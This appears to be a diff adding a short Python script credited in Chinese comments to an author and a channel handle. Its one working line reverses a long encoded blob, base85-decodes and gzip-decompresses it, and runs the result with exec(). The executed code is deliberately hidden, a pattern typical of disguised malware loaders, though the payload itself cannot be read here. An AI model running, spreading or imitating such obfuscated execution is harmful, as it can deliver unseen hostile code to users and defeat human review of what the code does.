@@ -1,0 +1,3 @@
+# 作者:发发
+# 频道:@td6699
+_ = lambda __ : __import__('gzip').decompress(__import__('base64').b85decode(__[::-1]));exec((_)(b'00zA&*!51$!0|6cVL?Tx#t)Z<iNkii$7mc<VR~@fc?8LA<{6+0k_5uSUL4O`&W<_8|VgC9D4QOElC!CZ;{DgtVkvhE0S<N^IY5SNQXg%@v+m|}oRocCgSyYVd2<R)o#%m+H+yuSY7e*;Geqw!8ZIYPFAj#&KeZ;oh>wH%Gxz~UMrSOry<88%&YN$ZTWJb<$@&yh~qhu2}eTyc3nAsHmx>o3hdPL_WEVgZpSO1>Wmi7_Y5wgm^P(<57T)yDnyAxjqV~hBt`IE%P$$CK2xC!{!7hNvkZt-N3wpz72lgqgvFK*b5zD^1d-Y+3~FHS_ti3=OZ2M0ek2VBB=z8EDv`-?@~enEKYQx~{cr?n&X2W=K$@h=-f%*sm(y%~6gnT!oa(a|~8Q*fkqbXdmCwo#j&O)TUl%qSJN8jT!i_VE+G`Lm!~l%1*9Hyfo~>^0ixb|@&-o_D&LZ71|FuKy{PwRv3AB*VM&!FSu6a)c7F1T1<hBwR4Q1(F`~#33SD8ikN(<DUW<mtn>Got!m_eIp{n-=_8>ebhaGI2Tp?XQI*!FgJE9#>qr_>R*#e#t{5hi{PIntEZj=Ob1NdvQg^z9s(O(BT7BL)DlqD4F+;u6bdxiPOA?{0)|TbM8YzBA'))
